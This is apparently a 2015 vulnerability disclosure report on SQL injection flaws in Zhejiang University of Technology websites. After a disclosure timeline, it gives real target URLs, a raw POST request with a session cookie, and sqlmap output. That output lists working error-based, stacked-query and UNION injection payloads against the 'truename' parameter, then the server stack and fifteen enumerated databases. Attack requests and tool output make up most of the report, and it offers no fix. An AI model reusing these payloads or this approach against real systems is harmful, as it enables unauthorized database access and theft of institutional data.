wybug_title: 浙江工业大学多处sql注入打包
wybug_detail:
漏洞详情 披露状态：   									2015-11-12：	细节已通知厂商并且等待厂商处理中									2015-11-12：	厂商已经确认，细节仅向厂商公开									2015-11-22：	细节向核心白帽子及相关领域专家公开									2015-12-02：	细节向普通白帽子公开									2015-12-12：	细节向实习白帽子公开									2015-12-27：	细节向公众公开  简要描述：  详细说明：  http://www.mba.zjut.edu.cn/cymba/show.php?id=2152


POST /oa/HX_GetPassWord.asp HTTP/1.1Content-Length: 247Content-Type: application/x-www-form-urlencodedCookie: ASPSESSIONIDSAARDRDT=JFJEMPOBCNHEPFFLJFIHFFAD; qq497827645Netcst=NetcstCheck=WSOAS%2EComHost: www.rdjt.zjut.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*Submit=%cf%c2%d2%bb%b2%bd&action=searchinfo&truename=123&UserName=lilufvgi

sqlmap resumed the following injection point(s) from stored session:---Parameter: truename (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Submit=%cf%c2%d2%bb%b2%bd&action=searchinfo&truename=123' AND 1473=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1473=1473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(113))) AND 'YmMv'='YmMv&UserName=lilufvgi    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Submit=%cf%c2%d2%bb%b2%bd&action=searchinfo&truename=123';WAITFOR DELAY '0:0:5'--&UserName=lilufvgi    Type: UNION query    Title: Generic UNION query (NULL) - 120 columns    Payload: Submit=%cf%c2%d2%bb%b2%bd&action=searchinfo&truename=123' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(114)+CHAR(79)+CHAR(88)+CHAR(116)+CHAR(65)+CHAR(84)+CHAR(66)+CHAR(120)+CHAR(77)+CHAR(119)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(113),NULL-- &UserName=lilufvgi---web server operating system: Windows 2000web application technology: ASP.NET, Microsoft IIS 5.0back-end DBMS: Microsoft SQL Server 2000available databases [15]:[*] BusinessDevelopment [*] Hospital[*] IndustryUniversity[*] ldmis2000[*] lionoa[*] master[*] model[*] msdb[*] Northwind[*] PropertyManage[*] pubs[*] rdjt[*] rongda[*] tempdb[*] zsdj
